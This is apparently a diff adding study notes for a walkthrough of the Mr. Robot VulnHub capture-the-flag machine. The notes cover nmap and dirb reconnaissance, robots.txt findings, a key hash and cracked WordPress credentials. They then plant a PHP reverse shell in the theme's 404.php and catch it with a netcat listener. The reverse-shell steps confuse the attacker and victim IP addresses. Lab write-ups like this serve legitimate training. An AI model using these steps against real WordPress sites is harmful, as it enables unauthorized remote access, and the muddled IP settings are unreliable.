@@ -1,0 +1,90 @@
+vulnhub
+https://vulnhub.com/
+
+tryhackme
+https://tryhackme.com/
+
+hackthebox
+https://www.hackthebox.com/
+
+
+									Mr. Robot VM
+									
+1) Find the victim's IP address
+Attacker IP: 10.0.2.15
+Victim IP: 10.0.2.7
+
+2) Port Scanning
+Command
+#nmap -sV -sU 10.0.2.7
+#nmap -T4 -A 10.0.2.7
+
+Open Ports
+80	http
+443 https
+
+3) Spidering(Directory BruteForce)
+	It can also be performed in Burpsuite(Crawl and Audit)
+	Command: dirb http://10.0.2.7/
+	Command: dirb https://10.0.2.7/
+	
+	robots.txt
+	This text files defines all the directories/webpages that is allowed or disallowed to be accessed by a spidering bot or other bots.
+	Ex: www.google.com/robots.txt
+	
+		http://10.0.2.7/robots.txt
+		
+	After spidering, we found a wordpress webpage
+	http://10.0.2.7/0/
+	We do not know the login credentials
+	
+
+http://10.0.2.7/robots.txt
+
+User agent: *
+fsocity.dic
+key-1-of-3.txt
+
+http://10.0.2.7/fsocity.dic
+
+Opening this webpage automatically downloaded a file fsocity.dic
+Command: wc -l fsocity.dic		//Command for word count
+The file contains 858160 words
+Sorting and writing the unique words onto another file
+Command: cat fsocity.dic | sort | uniq > wordlists.txt	//Sorts and finds uniqe keywords and stores the values onto wordlists.txt
+Word count is 11451.
+Command: wc -l wordlists.txt
+
+http://10.0.2.7/key-1-of-3.txt
+
+The objective of the Mr. Robot Virtual Machine is to find 3 keys. The first of 3 keys is found.
+Key_1: 073403c8a58a1f80d943455fb30724b9
+
+Perform password cracking using fuzzing technique to find the username and password for wordpress webpage	
+username: elliot
+password: ER28-0652
+Login using these credentials
+
+Copy the file present by default in Kali Linux
+cp /usr/share/webshells/php/php-reverse-shell.php .		//php-reverse-shell.php is a malware template
+This file contains code to give shell access to the victim. It is a read-only file.
+Edit the file and click on Save-as because it can't be saved since it is read-only
+From: LHOST="127.0.0.1"
+To: LHOST="10.0.2.7"		//IP address of the device to be given access to
+
+Create a listener
+Command: #nc -nlvp 1234				//Starting listener
+Here, 1234 is the port number, it is also displayed in the php-reverse-shell.php file
+
+Dashboard of the Wordpress is opened
+Open the Dashboard -> Appearance -> Editor
+GoTo Templates -> 404.php
+Edit the 404.php file
+Replace the contents with the contents of changed php-reverse-shell.php file.
+Update File
+
+http://10.0.2.7/fwaserf		//Some directory that does not exist
+When a directory that does not exist is requested, a 404-Not Found error is to be displayed.
+But we changed the contents of the 404.php file into our malware.
+The changed php-reverse-shell.php malware will be executed
+This gives the shell access to our system(10.0.2.7).
